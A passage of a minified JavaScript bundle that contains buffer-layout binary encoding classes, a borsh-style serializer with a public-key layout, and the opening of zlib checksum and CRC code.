              return n.encode(this, t, e);
            },
            writable: !0,
          }),
          Object.defineProperty(e, "decode", {
            value: function (t, e) {
              return n.decode(t, e);
            },
            writable: !0,
          });
      });
    class n extends t {
      isCount() {
        throw new Error("ExternalLayout is abstract");
      }
    }
    class r extends n {
      constructor(t, e) {
        if ((void 0 === t && (t = 1), !Number.isInteger(t) || 0 >= t))
          throw new TypeError("elementSpan must be a (positive) integer");
        super(-1, e), (this.elementSpan = t);
      }
      isCount() {
        return !0;
      }
      decode(t, e) {
        void 0 === e && (e = 0);
        const n = t.length - e;
        return Math.floor(n / this.elementSpan);
      }
      encode(t, e, n) {
        return 0;
      }
    }
    class o extends n {
      constructor(e, n, r) {
        if (!(e instanceof t)) throw new TypeError("layout must be a Layout");
        if (void 0 === n) n = 0;
        else if (!Number.isInteger(n))
          throw new TypeError("offset must be integer or undefined");
        super(e.span, r || e.property), (this.layout = e), (this.offset = n);
      }
      isCount() {
        return this.layout instanceof i || this.layout instanceof s;
      }
      decode(t, e) {
        return void 0 === e && (e = 0), this.layout.decode(t, e + this.offset);
      }
      encode(t, e, n) {
        return (
          void 0 === n && (n = 0), this.layout.encode(t, e, n + this.offset)
        );
      }
    }
    class i extends t {
      constructor(t, e) {
        if ((super(t, e), 6 < this.span))
          throw new RangeError("span must not exceed 6 bytes");
      }
      decode(t, e) {
        return void 0 === e && (e = 0), t.readUIntLE(e, this.span);
      }
      encode(t, e, n) {
        return (
          void 0 === n && (n = 0), e.writeUIntLE(t, n, this.span), this.span
        );
      }
    }
    class s extends t {
      constructor(t, e) {
        if ((super(t, e), 6 < this.span))
          throw new RangeError("span must not exceed 6 bytes");
      }
      decode(t, e) {
        return void 0 === e && (e = 0), t.readUIntBE(e, this.span);
      }
      encode(t, e, n) {
        return (
          void 0 === n && (n = 0), e.writeUIntBE(t, n, this.span), this.span
        );
      }
    }
    class a extends t {
      constructor(t, e) {
        if ((super(t, e), 6 < this.span))
          throw new RangeError("span must not exceed 6 bytes");
      }
      decode(t, e) {
        return void 0 === e && (e = 0), t.readIntLE(e, this.span);
      }
      encode(t, e, n) {
        return (
          void 0 === n && (n = 0), e.writeIntLE(t, n, this.span), this.span
        );
      }
    }
    class u extends t {
      constructor(t, e) {
        if ((super(t, e), 6 < this.span))
          throw new RangeError("span must not exceed 6 bytes");
      }
      decode(t, e) {
        return void 0 === e && (e = 0), t.readIntBE(e, this.span);
      }
      encode(t, e, n) {
        return (
          void 0 === n && (n = 0), e.writeIntBE(t, n, this.span), this.span
        );
      }
    }
    const c = Math.pow(2, 32);
    function l(t) {
      const e = Math.floor(t / c);
      return { hi32: e, lo32: t - e * c };
    }
    function d(t, e) {
      return t * c + e;
    }
    class f extends t {
      constructor(t) {
        super(8, t);
      }
      decode(t, e) {
        void 0 === e && (e = 0);
        const n = t.readUInt32LE(e);
        return d(t.readUInt32LE(e + 4), n);
      }
      encode(t, e, n) {
        void 0 === n && (n = 0);
        const r = l(t);
        return e.writeUInt32LE(r.lo32, n), e.writeUInt32LE(r.hi32, n + 4), 8;
      }
    }
    class h extends t {
      constructor(t) {
        super(8, t);
      }
      decode(t, e) {
        void 0 === e && (e = 0);
        return d(t.readUInt32BE(e), t.readUInt32BE(e + 4));
      }
      encode(t, e, n) {
        void 0 === n && (n = 0);
        const r = l(t);
        return e.writeUInt32BE(r.hi32, n), e.writeUInt32BE(r.lo32, n + 4), 8;
      }
    }
    class p extends t {
      constructor(t) {
        super(8, t);
      }
      decode(t, e) {
        void 0 === e && (e = 0);
        const n = t.readUInt32LE(e);
        return d(t.readInt32LE(e + 4), n);
      }
      encode(t, e, n) {
        void 0 === n && (n = 0);
        const r = l(t);
        return e.writeUInt32LE(r.lo32, n), e.writeInt32LE(r.hi32, n + 4), 8;
      }
    }
    class m extends t {
      constructor(t) {
        super(8, t);
      }
      decode(t, e) {
        void 0 === e && (e = 0);
        return d(t.readInt32BE(e), t.readUInt32BE(e + 4));
      }
      encode(t, e, n) {
        void 0 === n && (n = 0);
        const r = l(t);
        return e.writeInt32BE(r.hi32, n), e.writeUInt32BE(r.lo32, n + 4), 8;
      }
    }
    class g extends t {
      constructor(t) {
        super(4, t);
      }
      decode(t, e) {
        return void 0 === e && (e = 0), t.readFloatLE(e);
      }
      encode(t, e, n) {
        return void 0 === n && (n = 0), e.writeFloatLE(t, n), 4;
      }
    }
    class y extends t {
      constructor(t) {
        super(4, t);
      }
      decode(t, e) {
        return void 0 === e && (e = 0), t.readFloatBE(e);
      }
      encode(t, e, n) {
        return void 0 === n && (n = 0), e.writeFloatBE(t, n), 4;
      }
    }
    class w extends t {
      constructor(t) {
        super(8, t);
      }
      decode(t, e) {
        return void 0 === e && (e = 0), t.readDoubleLE(e);
      }
      encode(t, e, n) {
        return void 0 === n && (n = 0), e.writeDoubleLE(t, n), 8;
      }
    }
    class b extends t {
      constructor(t) {
        super(8, t);
      }
      decode(t, e) {
        return void 0 === e && (e = 0), t.readDoubleBE(e);
      }
      encode(t, e, n) {
        return void 0 === n && (n = 0), e.writeDoubleBE(t, n), 8;
      }
    }
    class v extends t {
      constructor(e, r, o) {
        if (!(e instanceof t))
          throw new TypeError("elementLayout must be a Layout");
        if (
          !((r instanceof n && r.isCount()) || (Number.isInteger(r) && 0 <= r))
        )
          throw new TypeError(
            "count must be non-negative integer or an unsigned integer ExternalLayout"
          );
        let i = -1;
        !(r instanceof n) && 0 < e.span && (i = r * e.span),
          super(i, o),
          (this.elementLayout = e),
          (this.count = r);
      }
      getSpan(t, e) {
        if (0 <= this.span) return this.span;
        void 0 === e && (e = 0);
        let r = 0,
          o = this.count;
        if (
          (o instanceof n && (o = o.decode(t, e)), 0 < this.elementLayout.span)
        )
          r = o * this.elementLayout.span;
        else {
          let n = 0;
          for (; n < o; ) (r += this.elementLayout.getSpan(t, e + r)), ++n;
        }
        return r;
      }
      decode(t, e) {
        void 0 === e && (e = 0);
        const r = [];
        let o = 0,
          i = this.count;
        for (i instanceof n && (i = i.decode(t, e)); o < i; )
          r.push(this.elementLayout.decode(t, e)),
            (e += this.elementLayout.getSpan(t, e)),
            (o += 1);
        return r;
      }
      encode(t, e, r) {
        void 0 === r && (r = 0);
        const o = this.elementLayout,
          i = t.reduce((t, n) => t + o.encode(n, e, r + t), 0);
        return this.count instanceof n && this.count.encode(t.length, e, r), i;
      }
    }
    class A extends t {
      constructor(e, n, r) {
        if (!Array.isArray(e) || !e.reduce((e, n) => e && n instanceof t, !0))
          throw new TypeError("fields must be array of Layout instances");
        "boolean" == typeof n && void 0 === r && ((r = n), (n = void 0));
        for (const t of e)
          if (0 > t.span && void 0 === t.property)
            throw new Error(
              "fields cannot contain unnamed variable-length layout"
            );
        let o = -1;
        try {
          o = e.reduce((t, e) => t + e.getSpan(), 0);
        } catch (i) {}
        super(o, n), (this.fields = e), (this.decodePrefixes = !!r);
      }
      getSpan(t, e) {
        if (0 <= this.span) return this.span;
        void 0 === e && (e = 0);
        let n = 0;
        try {
          n = this.fields.reduce((n, r) => {
            const o = r.getSpan(t, e);
            return (e += o), n + o;
          }, 0);
        } catch (r) {
          throw new RangeError("indeterminate span");
        }
        return n;
      }
      decode(t, e) {
        void 0 === e && (e = 0);
        const n = this.makeDestinationObject();
        for (const r of this.fields)
          if (
            (void 0 !== r.property && (n[r.property] = r.decode(t, e)),
            (e += r.getSpan(t, e)),
            this.decodePrefixes && t.length === e)
          )
            break;
        return n;
      }
      encode(t, e, n) {
        void 0 === n && (n = 0);
        const r = n;
        let o = 0,
          i = 0;
        for (const s of this.fields) {
          let r = s.span;
          if (((i = 0 < r ? r : 0), void 0 !== s.property)) {
            const o = t[s.property];
            void 0 !== o &&
              ((i = s.encode(o, e, n)), 0 > r && (r = s.getSpan(e, n)));
          }
          (o = n), (n += r);
        }
        return o + i - r;
      }
      fromArray(t) {
        const e = this.makeDestinationObject();
        for (const n of this.fields)
          void 0 !== n.property && 0 < t.length && (e[n.property] = t.shift());
        return e;
      }
      layoutFor(t) {
        if ("string" != typeof t)
          throw new TypeError("property must be string");
        for (const e of this.fields) if (e.property === t) return e;
      }
      offsetOf(t) {
        if ("string" != typeof t)
          throw new TypeError("property must be string");
        let e = 0;
        for (const n of this.fields) {
          if (n.property === t) return e;
          0 > n.span ? (e = -1) : 0 <= e && (e += n.span);
        }
      }
    }
    class k {
      constructor(t) {
        this.property = t;
      }
      decode() {
        throw new Error("UnionDiscriminator is abstract");
      }
      encode() {
        throw new Error("UnionDiscriminator is abstract");
      }
    }
    class I extends k {
      constructor(t, e) {
        if (!(t instanceof n && t.isCount()))
          throw new TypeError(
            "layout must be an unsigned integer ExternalLayout"
          );
        super(e || t.property || "variant"), (this.layout = t);
      }
      decode(t, e) {
        return this.layout.decode(t, e);
      }
      encode(t, e, n) {
        return this.layout.encode(t, e, n);
      }
    }
    class S extends t {
      constructor(e, r, a) {
        const u = e instanceof i || e instanceof s;
        if (u) e = new I(new o(e));
        else if (e instanceof n && e.isCount()) e = new I(e);
        else if (!(e instanceof k))
          throw new TypeError(
            "discr must be a UnionDiscriminator or an unsigned integer layout"
          );
        if ((void 0 === r && (r = null), !(null === r || r instanceof t)))
          throw new TypeError("defaultLayout must be null or a Layout");
        if (null !== r) {
          if (0 > r.span)
            throw new Error("defaultLayout must have constant span");
          void 0 === r.property && (r = r.replicate("content"));
        }
        let c = -1;
        r && ((c = r.span), 0 <= c && u && (c += e.layout.span)),
          super(c, a),
          (this.discriminator = e),
          (this.usesPrefixDiscriminator = u),
          (this.defaultLayout = r),
          (this.registry = {});
        let l = this.defaultGetSourceVariant.bind(this);
        (this.getSourceVariant = function (t) {
          return l(t);
        }),
          (this.configGetSourceVariant = function (t) {
            l = t.bind(this);
          });
      }
      getSpan(t, e) {
        if (0 <= this.span) return this.span;
        void 0 === e && (e = 0);
        const n = this.getVariant(t, e);
        if (!n)
          throw new Error("unable to determine span for unrecognized variant");
        return n.getSpan(t, e);
      }
      defaultGetSourceVariant(t) {
        if (t.hasOwnProperty(this.discriminator.property)) {
          if (
            this.defaultLayout &&
            t.hasOwnProperty(this.defaultLayout.property)
          )
            return;
          const e = this.registry[t[this.discriminator.property]];
          if (e && (!e.layout || t.hasOwnProperty(e.property))) return e;
        } else
          for (const e in this.registry) {
            const n = this.registry[e];
            if (t.hasOwnProperty(n.property)) return n;
          }
        throw new Error("unable to infer src variant");
      }
      decode(t, e) {
        let n;
        void 0 === e && (e = 0);
        const r = this.discriminator,
          o = r.decode(t, e);
        let i = this.registry[o];
        if (void 0 === i) {
          let s = 0;
          (i = this.defaultLayout),
            this.usesPrefixDiscriminator && (s = r.layout.span),
            (n = this.makeDestinationObject()),
            (n[r.property] = o),
            (n[i.property] = this.defaultLayout.decode(t, e + s));
        } else n = i.decode(t, e);
        return n;
      }
      encode(t, e, n) {
        void 0 === n && (n = 0);
        const r = this.getSourceVariant(t);
        if (void 0 === r) {
          const r = this.discriminator,
            o = this.defaultLayout;
          let i = 0;
          return (
            this.usesPrefixDiscriminator && (i = r.layout.span),
            r.encode(t[r.property], e, n),
            i + o.encode(t[o.property], e, n + i)
          );
        }
        return r.encode(t, e, n);
      }
      addVariant(t, e, n) {
        const r = new _(this, t, e, n);
        return (this.registry[t] = r), r;
      }
      getVariant(t, e) {
        let n = t;
        return (
          ct.isBuffer(t) &&
            (void 0 === e && (e = 0), (n = this.discriminator.decode(t, e))),
          this.registry[n]
        );
      }
    }
    class _ extends t {
      constructor(e, n, r, o) {
        if (!(e instanceof S)) throw new TypeError("union must be a Union");
        if (!Number.isInteger(n) || 0 > n)
          throw new TypeError("variant must be a (non-negative) integer");
        if (
          ("string" == typeof r && void 0 === o && ((o = r), (r = null)), r)
        ) {
          if (!(r instanceof t)) throw new TypeError("layout must be a Layout");
          if (
            null !== e.defaultLayout &&
            0 <= r.span &&
            r.span > e.defaultLayout.span
          )
            throw new Error("variant span exceeds span of containing union");
          if ("string" != typeof o)
            throw new TypeError("variant must have a String property");
        }
        let i = e.span;
        0 > e.span &&
          ((i = r ? r.span : 0),
          0 <= i &&
            e.usesPrefixDiscriminator &&
            (i += e.discriminator.layout.span)),
          super(i, o),
          (this.union = e),
          (this.variant = n),
          (this.layout = r || null);
      }
      getSpan(t, e) {
        if (0 <= this.span) return this.span;
        void 0 === e && (e = 0);
        let n = 0;
        return (
          this.union.usesPrefixDiscriminator &&
            (n = this.union.discriminator.layout.span),
          n + this.layout.getSpan(t, e + n)
        );
      }
      decode(t, e) {
        const n = this.makeDestinationObject();
        if ((void 0 === e && (e = 0), this !== this.union.getVariant(t, e)))
          throw new Error("variant mismatch");
        let r = 0;
        return (
          this.union.usesPrefixDiscriminator &&
            (r = this.union.discriminator.layout.span),
          this.layout
            ? (n[this.property] = this.layout.decode(t, e + r))
            : this.property
            ? (n[this.property] = !0)
            : this.union.usesPrefixDiscriminator &&
              (n[this.union.discriminator.property] = this.variant),
          n
        );
      }
      encode(t, e, n) {
        void 0 === n && (n = 0);
        let r = 0;
        if (
          (this.union.usesPrefixDiscriminator &&
            (r = this.union.discriminator.layout.span),
          this.layout && !t.hasOwnProperty(this.property))
        )
          throw new TypeError("variant lacks property " + this.property);
        this.union.discriminator.encode(this.variant, e, n);
        let o = r;
        if (
          this.layout &&
          (this.layout.encode(t[this.property], e, n + r),
          (o += this.layout.getSpan(e, n + r)),
          0 <= this.union.span && o > this.union.span)
        )
          throw new Error("encoded variant overruns containing union");
        return o;
      }
      fromArray(t) {
        if (this.layout) return this.layout.fromArray(t);
      }
    }
    function T(t) {
      return 0 > t && (t += 4294967296), t;
    }
    class C extends t {
      constructor(t, e, n) {
        if (!(t instanceof i || t instanceof s))
          throw new TypeError("word must be a UInt or UIntBE layout");
        if (
          ("string" == typeof e && void 0 === n && ((n = e), (e = void 0)),
          4 < t.span)
        )
          throw new RangeError("word cannot exceed 32 bits");
        super(t.span, n), (this.word = t), (this.msb = !!e), (this.fields = []);
        let r = 0;
        (this._packedSetValue = function (t) {
          return (r = T(t)), this;
        }),
          (this._packedGetValue = function () {
            return r;
          });
      }
      decode(t, e) {
        const n = this.makeDestinationObject();
        void 0 === e && (e = 0);
        const r = this.word.decode(t, e);
        this._packedSetValue(r);
        for (const o of this.fields)
          void 0 !== o.property && (n[o.property] = o.decode(r));
        return n;
      }
      encode(t, e, n) {
        void 0 === n && (n = 0);
        const r = this.word.decode(e, n);
        this._packedSetValue(r);
        for (const o of this.fields)
          if (void 0 !== o.property) {
            const e = t[o.property];
            void 0 !== e && o.encode(e);
          }
        return this.word.encode(this._packedGetValue(), e, n);
      }
      addField(t, e) {
        const n = new B(this, t, e);
        return this.fields.push(n), n;
      }
      addBoolean(t) {
        const e = new E(this, t);
        return this.fields.push(e), e;
      }
      fieldFor(t) {
        if ("string" != typeof t)
          throw new TypeError("property must be string");
        for (const e of this.fields) if (e.property === t) return e;
      }
    }
    class B {
      constructor(t, e, n) {
        if (!(t instanceof C))
          throw new TypeError("container must be a BitStructure");
        if (!Number.isInteger(e) || 0 >= e)
          throw new TypeError("bits must be positive integer");
        const r = 8 * t.span,
          o = t.fields.reduce((t, e) => t + e.bits, 0);
        if (e + o > r)
          throw new Error(
            "bits too long for span remainder (" +
              (r - o) +
              " of " +
              r +
              " remain)"
          );
        (this.container = t),
          (this.bits = e),
          (this.valueMask = (1 << e) - 1),
          32 === e && (this.valueMask = 4294967295),
          (this.start = o),
          this.container.msb && (this.start = r - o - e),
          (this.wordMask = T(this.valueMask << this.start)),
          (this.property = n);
      }
      decode() {
        return (
          T(this.container._packedGetValue() & this.wordMask) >>> this.start
        );
      }
      encode(t) {
        if (!Number.isInteger(t) || t !== T(t & this.valueMask))
          throw new TypeError(
            e("BitField.encode", this) +
              " value must be integer not exceeding " +
              this.valueMask
          );
        const n = this.container._packedGetValue(),
          r = T(t << this.start);
        this.container._packedSetValue(T(n & ~this.wordMask) | r);
      }
    }
    class E extends B {
      constructor(t, e) {
        super(t, 1, e);
      }
      decode(t, e) {
        return !!B.prototype.decode.call(this, t, e);
      }
      encode(t) {
        return (
          "boolean" == typeof t && (t = +t), B.prototype.encode.call(this, t)
        );
      }
    }
    class x extends t {
      constructor(t, e) {
        if (
          !((t instanceof n && t.isCount()) || (Number.isInteger(t) && 0 <= t))
        )
          throw new TypeError(
            "length must be positive integer or an unsigned integer ExternalLayout"
          );
        let r = -1;
        t instanceof n || (r = t), super(r, e), (this.length = t);
      }
      getSpan(t, e) {
        let n = this.span;
        return 0 > n && (n = this.length.decode(t, e)), n;
      }
      decode(t, e) {
        void 0 === e && (e = 0);
        let n = this.span;
        return 0 > n && (n = this.length.decode(t, e)), t.slice(e, e + n);
      }
      encode(t, r, o) {
        let i = this.length;
        if (
          (this.length instanceof n && (i = t.length),
          !ct.isBuffer(t) || i !== t.length)
        )
          throw new TypeError(
            e("Blob.encode", this) +
              " requires (length " +
              i +
              ") Buffer as src"
          );
        if (o + i > r.length) throw new RangeError("encoding overruns Buffer");
        return (
          r.write(t.toString("hex"), o, i, "hex"),
          this.length instanceof n && this.length.encode(i, r, o),
          i
        );
      }
    }
    class P extends t {
      constructor(t) {
        super(-1, t);
      }
      getSpan(t, e) {
        if (!ct.isBuffer(t)) throw new TypeError("b must be a Buffer");
        void 0 === e && (e = 0);
        let n = e;
        for (; n < t.length && 0 !== t[n]; ) n += 1;
        return 1 + n - e;
      }
      decode(t, e, n) {
        void 0 === e && (e = 0);
        let r = this.getSpan(t, e);
        return t.slice(e, e + r - 1).toString("utf-8");
      }
      encode(t, e, n) {
        void 0 === n && (n = 0), "string" != typeof t && (t = t.toString());
        const r = new ct(t, "utf8"),
          o = r.length;
        if (n + o > e.length) throw new RangeError("encoding overruns Buffer");
        return r.copy(e, n), (e[n + o] = 0), o + 1;
      }
    }
    class R extends t {
      constructor(t, e) {
        if (
          ("string" == typeof t && void 0 === e && ((e = t), (t = void 0)),
          void 0 === t)
        )
          t = -1;
        else if (!Number.isInteger(t))
          throw new TypeError("maxSpan must be an integer");
        super(-1, e), (this.maxSpan = t);
      }
      getSpan(t, e) {
        if (!ct.isBuffer(t)) throw new TypeError("b must be a Buffer");
        return void 0 === e && (e = 0), t.length - e;
      }
      decode(t, e, n) {
        void 0 === e && (e = 0);
        let r = this.getSpan(t, e);
        if (0 <= this.maxSpan && this.maxSpan < r)
          throw new RangeError("text length exceeds maxSpan");
        return t.slice(e, e + r).toString("utf-8");
      }
      encode(t, e, n) {
        void 0 === n && (n = 0), "string" != typeof t && (t = t.toString());
        const r = new ct(t, "utf8"),
          o = r.length;
        if (0 <= this.maxSpan && this.maxSpan < o)
          throw new RangeError("text length exceeds maxSpan");
        if (n + o > e.length) throw new RangeError("encoding overruns Buffer");
        return r.copy(e, n), o;
      }
    }
    class O extends t {
      constructor(t, e) {
        super(0, e), (this.value = t);
      }
      decode(t, e, n) {
        return this.value;
      }
      encode(t, e, n) {
        return 0;
      }
    }
    return (
      (Dl.ExternalLayout = n),
      (Dl.GreedyCount = r),
      (Dl.OffsetLayout = o),
      (Dl.UInt = i),
      (Dl.UIntBE = s),
      (Dl.Int = a),
      (Dl.IntBE = u),
      (Dl.Float = g),
      (Dl.FloatBE = y),
      (Dl.Double = w),
      (Dl.DoubleBE = b),
      (Dl.Sequence = v),
      (Dl.Structure = A),
      (Dl.UnionDiscriminator = k),
      (Dl.UnionLayoutDiscriminator = I),
      (Dl.Union = S),
      (Dl.VariantLayout = _),
      (Dl.BitStructure = C),
      (Dl.BitField = B),
      (Dl.Boolean = E),
      (Dl.Blob = x),
      (Dl.CString = P),
      (Dl.UTF8 = R),
      (Dl.Constant = O),
      (Dl.greedy = (t, e) => new r(t, e)),
      (Dl.offset = (t, e, n) => new o(t, e, n)),
      (Dl.u8 = (t) => new i(1, t)),
      (Dl.u16 = (t) => new i(2, t)),
      (Dl.u24 = (t) => new i(3, t)),
      (Dl.u32 = (t) => new i(4, t)),
      (Dl.u40 = (t) => new i(5, t)),
      (Dl.u48 = (t) => new i(6, t)),
      (Dl.nu64 = (t) => new f(t)),
      (Dl.u16be = (t) => new s(2, t)),
      (Dl.u24be = (t) => new s(3, t)),
      (Dl.u32be = (t) => new s(4, t)),
      (Dl.u40be = (t) => new s(5, t)),
      (Dl.u48be = (t) => new s(6, t)),
      (Dl.nu64be = (t) => new h(t)),
      (Dl.s8 = (t) => new a(1, t)),
      (Dl.s16 = (t) => new a(2, t)),
      (Dl.s24 = (t) => new a(3, t)),
      (Dl.s32 = (t) => new a(4, t)),
      (Dl.s40 = (t) => new a(5, t)),
      (Dl.s48 = (t) => new a(6, t)),
      (Dl.ns64 = (t) => new p(t)),
      (Dl.s16be = (t) => new u(2, t)),
      (Dl.s24be = (t) => new u(3, t)),
      (Dl.s32be = (t) => new u(4, t)),
      (Dl.s40be = (t) => new u(5, t)),
      (Dl.s48be = (t) => new u(6, t)),
      (Dl.ns64be = (t) => new m(t)),
      (Dl.f32 = (t) => new g(t)),
      (Dl.f32be = (t) => new y(t)),
      (Dl.f64 = (t) => new w(t)),
      (Dl.f64be = (t) => new b(t)),
      (Dl.struct = (t, e, n) => new A(t, e, n)),
      (Dl.bits = (t, e, n) => new C(t, e, n)),
      (Dl.seq = (t, e, n) => new v(t, e, n)),
      (Dl.union = (t, e, n) => new S(t, e, n)),
      (Dl.unionLayoutDiscriminator = (t, e) => new I(t, e)),
      (Dl.blob = (t, e) => new x(t, e)),
      (Dl.cstr = (t) => new P(t)),
      (Dl.utf8 = (t, e) => new R(t, e)),
      (Dl.const = (t, e) => new O(t, e)),
      Dl
    );
  }
  const ql = Wn(Sc);
  var Wl;
  var zl =
    (Wl ||
      ((Wl = 1),
      (function (t) {
        window.skCrypt = function (t) {
          return function () {
            return t;
          };
        };
        var e =
          (Nl && Nl.__importDefault) ||
          function (t) {
            return t && t.__esModule ? t : { default: t };
          };
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.struct =
            t.f64 =
            t.f32 =
            t.i32 =
            t.u32 =
            t.i16 =
            t.u16 =
            t.i8 =
            t.u8 =
              void 0),
          (t.u64 = a),
          (t.i64 = function (t) {
            return new s(8, !0, t);
          }),
          (t.u128 = function (t) {
            return new s(16, !1, t);
          }),
          (t.i128 = function (t) {
            return new s(16, !0, t);
          }),
          (t.u256 = function (t) {
            return new s(32, !1, t);
          }),
          (t.i256 = function (t) {
            return new s(32, !0, t);
          }),
          (t.publicKey = function (t) {
            return new u(
              (0, n.blob)(32),
              (t) => new r.PublicKey(t),
              (t) => t.toBuffer(),
              t
            );
          }),
          (t.option = function (t, e) {
            return new c(t, e);
          }),
          (t.bool = function (t) {
            return new u((0, n.u8)(), l, d, t);
          }),
          (t.vec = function (t, e) {
            const r = (0, n.u32)("length"),
              o = (0, n.struct)([
                r,
                (0, n.seq)(t, (0, n.offset)(r, -r.span), "values"),
              ]);
            return new u(
              o,
              ({ values: t }) => t,
              (t) => ({ values: t }),
              e
            );
          }),
          (t.tagged = function (t, e, r) {
            const o = (0, n.struct)([a("tag"), e.replicate("data")]);
            return new u(
              o,
              function ({ tag: e, data: n }) {
                if (!e.eq(t))
                  throw new Error(
                    "Invalid tag, expected: " +
                      t.toString("hex") +
                      ", got: " +
                      e.toString("hex")
                  );
                return n;
              },
              (e) => ({ tag: t, data: e }),
              r
            );
          }),
          (t.vecU8 = f),
          (t.str = function (t) {
            return new u(
              f(),
              (t) => t.toString("utf-8"),
              (t) => ct.from(t, "utf-8"),
              t
            );
          }),
          (t.rustEnum = function (t, e, r) {
            const o = (0, n.union)(null != r ? r : (0, n.u8)(), e);
            return t.forEach((t, e) => o.addVariant(e, t, t.property)), o;
          }),
          (t.array = function (t, e, r) {
            const o = (0, n.struct)([(0, n.seq)(t, e, "values")]);
            return new u(
              o,
              ({ values: t }) => t,
              (t) => ({ values: t }),
              r
            );
          }),
          (t.map = function (t, e, r) {
            const o = (0, n.u32)("length"),
              i = (0, n.struct)([
                o,
                (0, n.seq)(new h(t, e), (0, n.offset)(o, -o.span), "values"),
              ]);
            return new u(
              i,
              ({ values: t }) => new Map(t),
              (t) => ({ values: Array.from(t.entries()) }),
              r
            );
          });
        const n = Ul(),
          r = ql,
          o = e(Hn());
        var i = Ul();
        Object.defineProperty(t, "u8", {
          enumerable: !0,
          get: function () {
            return i.u8;
          },
        }),
          Object.defineProperty(t, "i8", {
            enumerable: !0,
            get: function () {
              return i.s8;
            },
          }),
          Object.defineProperty(t, "u16", {
            enumerable: !0,
            get: function () {
              return i.u16;
            },
          }),
          Object.defineProperty(t, "i16", {
            enumerable: !0,
            get: function () {
              return i.s16;
            },
          }),
          Object.defineProperty(t, "u32", {
            enumerable: !0,
            get: function () {
              return i.u32;
            },
          }),
          Object.defineProperty(t, "i32", {
            enumerable: !0,
            get: function () {
              return i.s32;
            },
          }),
          Object.defineProperty(t, "f32", {
            enumerable: !0,
            get: function () {
              return i.f32;
            },
          }),
          Object.defineProperty(t, "f64", {
            enumerable: !0,
            get: function () {
              return i.f64;
            },
          }),
          Object.defineProperty(t, "struct", {
            enumerable: !0,
            get: function () {
              return i.struct;
            },
          });
        class s extends n.Layout {
          constructor(t, e, r) {
            super(t, r), (this.blob = (0, n.blob)(t)), (this.signed = e);
          }
          decode(t, e = 0) {
            const n = new o.default(this.blob.decode(t, e), 10, "le");
            return this.signed ? n.fromTwos(8 * this.span).clone() : n;
          }
          encode(t, e, n = 0) {
            return (
              this.signed && (t = t.toTwos(8 * this.span)),
              this.blob.encode(t.toArrayLike(ct, "le", this.span), e, n)
            );
          }
        }
        function a(t) {
          return new s(8, !1, t);
        }
        class u extends n.Layout {
          constructor(t, e, n, r) {
            super(t.span, r),
              (this.layout = t),
              (this.decoder = e),
              (this.encoder = n);
          }
          decode(t, e) {
            return this.decoder(this.layout.decode(t, e));
          }
          encode(t, e, n) {
            return this.layout.encode(this.encoder(t), e, n);
          }
          getSpan(t, e) {
            return this.layout.getSpan(t, e);
          }
        }
        class c extends n.Layout {
          constructor(t, e) {
            super(-1, e), (this.layout = t), (this.discriminator = (0, n.u8)());
          }
          encode(t, e, n = 0) {
            return null == t
              ? this.discriminator.encode(0, e, n)
              : (this.discriminator.encode(1, e, n),
                this.layout.encode(t, e, n + 1) + 1);
          }
          decode(t, e = 0) {
            const n = this.discriminator.decode(t, e);
            if (0 === n) return null;
            if (1 === n) return this.layout.decode(t, e + 1);
            throw new Error("Invalid option " + this.property);
          }
          getSpan(t, e = 0) {
            const n = this.discriminator.decode(t, e);
            if (0 === n) return 1;
            if (1 === n) return this.layout.getSpan(t, e + 1) + 1;
            throw new Error("Invalid option " + this.property);
          }
        }
        function l(t) {
          if (0 === t) return !1;
          if (1 === t) return !0;
          throw new Error("Invalid bool: " + t);
        }
        function d(t) {
          return t ? 1 : 0;
        }
        function f(t) {
          const e = (0, n.u32)("length"),
            r = (0, n.struct)([
              e,
              (0, n.blob)((0, n.offset)(e, -e.span), "data"),
            ]);
          return new u(
            r,
            ({ data: t }) => t,
            (t) => ({ data: t }),
            t
          );
        }
        class h extends n.Layout {
          constructor(t, e, n) {
            super(t.span + e.span, n),
              (this.keyLayout = t),
              (this.valueLayout = e);
          }
          decode(t, e) {
            return (
              (e = e || 0),
              [
                this.keyLayout.decode(t, e),
                this.valueLayout.decode(t, e + this.keyLayout.getSpan(t, e)),
              ]
            );
          }
          encode(t, e, n) {
            n = n || 0;
            const r = this.keyLayout.encode(t[0], e, n);
            return r + this.valueLayout.encode(t[1], e, n + r);
          }
          getSpan(t, e) {
            return (
              this.keyLayout.getSpan(t, e) + this.valueLayout.getSpan(t, e)
            );
          }
        }
      })(Nl)),
    Nl);
  function Kl(t) {
    let e = t.length;
    for (; --e >= 0; ) t[e] = 0;
  }
  Kl(new Array(576));
  Kl(new Array(60));
  Kl(new Array(512));
  Kl(new Array(256));
  Kl(new Array(29));
  Kl(new Array(30));
  var Fl = (t, e, n, r) => {
    let o = 65535 & t,
      i = (t >>> 16) & 65535,
      s = 0;
    for (; 0 !== n; ) {
      (s = n > 2e3 ? 2e3 : n), (n -= s);
      do {
        (o = (o + e[r++]) | 0), (i = (i + o) | 0);
      } while (--s);
      (o %= 65521), (i %= 65521);
    }
    return o | (i << 16);
  };
  const jl = new Uint32Array(
    (() => {
      let t,
        e = [];
      for (var n = 0; n < 256; n++) {
        t = n;
        for (var r = 0; r < 8; r++)
          t = 1 & t ? 3988292384 ^ (t >>> 1) : t >>> 1;
        e[n] = t;
      }
      return e;
    })()
  );
  var Gl = (t, e, n, r) => {
      const o = jl,
        i = r + n;
      t ^= -1;
      for (let s = r; s < i; s++) t = (t >>> 8) ^ o[255 & (t ^ e[s])];
      return -1 ^ t;
    },
    Vl = {
      2: "need dictionary",
      1: "stream end",
      0: "",
      "-1": "file error",
      "-2": "stream error",
      "-3": "data error",
      "-4": "insufficient memory",
      "-5": "buffer error",
      "-6": "incompatible version",
    },
    Hl = {
      Z_NO_FLUSH: 0,
      Z_FINISH: 4,
      Z_BLOCK: 5,
      Z_TREES: 6,
      Z_OK: 0,
      Z_STREAM_END: 1,
      Z_NEED_DICT: 2,
      Z_STREAM_ERROR: -2,
      Z_DATA_ERROR: -3,
      Z_MEM_ERROR: -4,
      Z_BUF_ERROR: -5,
      Z_DEFLATED: 8,
    };
  const Xl = (t, e) => Object.prototype.hasOwnProperty.call(t, e);
  var Zl = function (t) {
      const e = Array.prototype.slice.call(arguments, 1);
      for (; e.length; ) {
        const n = e.shift();
        if (n) {
          if ("object" != typeof n)
            throw new TypeError(n + "must be non-object");
          for (const e in n) Xl(n, e) && (t[e] = n[e]);
        }
      }
      return t;
    },
    Jl = (t) => {
      let e = 0;
      for (let r = 0, o = t.length; r < o; r++) e += t[r].length;
      const n = new Uint8Array(e);
